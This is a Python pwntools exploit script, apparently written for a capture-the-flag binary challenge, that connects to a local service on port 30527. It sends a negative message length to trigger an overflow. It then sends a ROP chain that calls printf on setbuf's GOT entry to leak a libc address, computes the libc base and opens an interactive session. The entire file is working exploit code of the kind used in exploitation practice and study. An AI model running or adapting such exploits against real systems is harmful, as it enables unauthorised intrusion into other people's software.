#! /usr/bin/env python
from pwn import *

rhp = {'host':"localhost", 'port':30527}

context(os = 'linux', arch = 'i386')

addr_plt_printf    = 0x08048430
addr_got_setbuf    = 0x0804a00c
addr_main          = 0x080485cb

offset_libc_setbuf = 0x00067b20

#==========

def attack(conn):
	rop  = p32(addr_plt_printf)
	rop += p32(addr_main)
	rop += p32(addr_got_setbuf)

	conn.recvuntil('Message Length >> ')
	conn.sendline(str(-144))
	conn.recvuntil('Name >> ')
	conn.sendline(rop)
	conn.recvuntil('Message : \n')

	addr_libc_setbuf     = u32(conn.recv(4))
	addr_libc_base       = addr_libc_setbuf - offset_libc_setbuf
	info('addr_libc_base = 0x%08x' % addr_libc_base)

#==========

if __name__ == '__main__':
	conn = remote(rhp['host'], rhp['port'])
	attack(conn)
	conn.interactive()

#==========

